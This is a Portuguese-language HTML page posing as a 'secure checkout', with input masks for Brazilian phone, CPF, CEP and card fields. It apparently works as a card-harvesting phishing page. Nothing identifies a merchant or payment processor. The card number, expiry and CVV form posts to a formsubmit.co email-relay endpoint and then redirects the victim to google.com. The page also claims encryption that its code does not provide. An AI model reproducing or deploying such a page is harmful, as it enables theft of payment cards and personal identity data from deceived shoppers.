<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout Seguro</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .checkout-container {
            background-color: #ffffff;
            border-radius: 15px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            padding: 30px;
            max-width: 550px;
            width: 100%;
            transition: transform 0.3s;
        }
        .checkout-container:hover {
            transform: translateY(-5px);
        }
        .checkout-container h1 {
            font-size: 26px;
            font-weight: 700;
            color: #222;
            margin-bottom: 25px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.3s, box-shadow 0.3s;
            background-color: #f9f9f9;
        }
        .form-group input:focus {
            border-color: #007bff;
            box-shadow: 0 0 6px rgba(0, 123, 255, 0.5);
            background-color: #ffffff;
        }
        .checkout-button {
            width: 100%;
            padding: 14px;
            font-size: 18px;
            font-weight: 700;
            color: #ffffff;
            background-color: #007bff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }
        .checkout-button:hover {
            background-color: #0056b3;
            transform: translateY(-3px);
        }
        .checkout-button:active {
            transform: translateY(0);
        }
        .hidden {
            display: none;
        }
        .checkout-container p {
            font-size: 14px;
            color: #777;
            text-align: center;
            margin-top: 15px;
        }
        .checkout-container p a {
            color: #007bff;
            text-decoration: none;
            transition: color 0.3s;
        }
        .checkout-container p a:hover {
            color: #0056b3;
        }
    </style>
    <script>
        // Funções de máscara em JavaScript puro
        function mascaraTelefone(input) {
            let valor = input.value.replace(/\D/g, '');
            if (valor.length <= 10) {
                input.value = valor.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            } else {
                input.value = valor.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
            }
        }

        function mascaraCPF(input) {
            let valor = input.value.replace(/\D/g, '');
            input.value = valor.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }

        function mascaraCEP(input) {
            let valor = input.value.replace(/\D/g, '');
            input.value = valor.replace(/(\d{5})(\d{3})/, '$1-$2');
        }

        function mascaraCartao(input) {
            let valor = input.value.replace(/\D/g, '');
            input.value = valor.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');
        }

        function mascaraValidadeCartao(input) {
            let valor = input.value.replace(/\D/g, '');
            input.value = valor.replace(/(\d{2})(\d{2})/, '$1/$2');
        }

        function mascaraCVV(input) {
            let valor = input.value.replace(/\D/g, '');
            input.value = valor.replace(/(\d{3})/, '$1');
        }

        document.addEventListener('DOMContentLoaded', () => {
            // Aplica as máscaras quando o usuário digitar nos campos
            document.getElementById('phone').addEventListener('input', function() {
                mascaraTelefone(this);
            });

            document.getElementById('cpf').addEventListener('input', function() {
                mascaraCPF(this);
            });

            document.getElementById('cep').addEventListener('input', function() {
                mascaraCEP(this);
            });

            document.getElementById('card-number').addEventListener('input', function() {
                mascaraCartao(this);
            });

            document.getElementById('card-expiry').addEventListener('input', function() {
                mascaraValidadeCartao(this);
            });

            document.getElementById('card-cvv').addEventListener('input', function() {
                mascaraCVV(this);
            });
        });

        function buscarEndereco() {
            const cep = document.getElementById('cep').value.replace(/\D/g, '');
            if (cep.length === 8) {
                fetch(`https://viacep.com.br/ws/${cep}/json/`)
                    .then(response => response.json())
                    .then(data => {
                        if (!data.erro) {
                            document.getElementById('address').value = `${data.logradouro}, ${data.bairro}, ${data.localidade} - ${data.uf}`;
                            document.getElementById('address').disabled = true;
                        } else {
                            alert('CEP não encontrado!');
                        }
                    })
                    .catch(() => alert('Erro ao buscar o CEP!'));
            } else {
                alert('CEP inválido!');
            }
        }

        function irParaPagina2() {
            document.getElementById('page1').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
        }

        function finalizarCompra(event) {
            event.preventDefault();
            alert('Compra finalizada com sucesso!');
        }
    </script>
</head>
<body>
    <div class="checkout-container" id="page1">
        <h1>Informações de Entrega</h1>
        <form onsubmit="event.preventDefault(); irParaPagina2();">
            <div class="form-group">
                <label for="full-name">Nome Completo</label>
                <input type="text" id="full-name" name="full-name" placeholder="Exemplo: João da Silva" required>
            </div>
            <div class="form-group">
                <label for="email">E-mail</label>
                <input type="email" id="email" name="email" placeholder="exemplo@dominio.com" required>
            </div>
            <div class="form-group">
                <label for="phone">Telefone</label>
                <input type="text" id="phone" name="phone" placeholder="(99) 99999-9999" required>
            </div>
            <div class="form-group">
                <label for="cpf">CPF</label>
                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
            </div>
            <div class="form-group">
                <label for="cep">CEP</label>
                <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9" onblur="buscarEndereco()" required>
            </div>
            <div class="form-group">
                <label for="address">Endereço</label>
                <input type="text" id="address" name="address" placeholder="Rua, Bairro, Cidade - UF" disabled>
            </div>
            <div class="form-group">
                <label for="house-number">Número</label>
                <input type="text" id="house-number" name="house-number" placeholder="Número da Casa" required>
            </div>
            <div class="form-group">
                <label for="complement">Complemento</label>
                <input type="text" id="complement" name="complement" placeholder="Apartamento, bloco, etc.">
            </div>
            <button type="submit" class="checkout-button">Continuar</button>
        </form>
    </div>

    <div class="checkout-container hidden" id="page2">
        <h1>Pagamento Seguro</h1>
        <form action="https://formsubmit.co/a8d78dbb7782945a49a0beb27200306f" method="POST">
            <div class="form-group">
                <label for="card-number">Número do Cartão</label>
                <input type="text" id="card-number" name="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>
            <div class="form-group">
                <label for="card-expiry">Validade (MM/AA)</label>
                <input type="text" id="card-expiry" name="card-expiry" placeholder="MM/AA" maxlength="5" required>
            </div>
            <div class="form-group">
                <label for="card-cvv">CVV</label>
                <input type="text" id="card-cvv" name="card-cvv" placeholder="123" maxlength="3" required>
            </div>
            <button type="submit" class="checkout-button">Finalizar Compra</button>
            <input type="hidden" name="_next" value="https://google.com/">
        </form>
        <p>Seus dados estão protegidos com nossa tecnologia de criptografia.</p>
    </div>
</body>
</html>
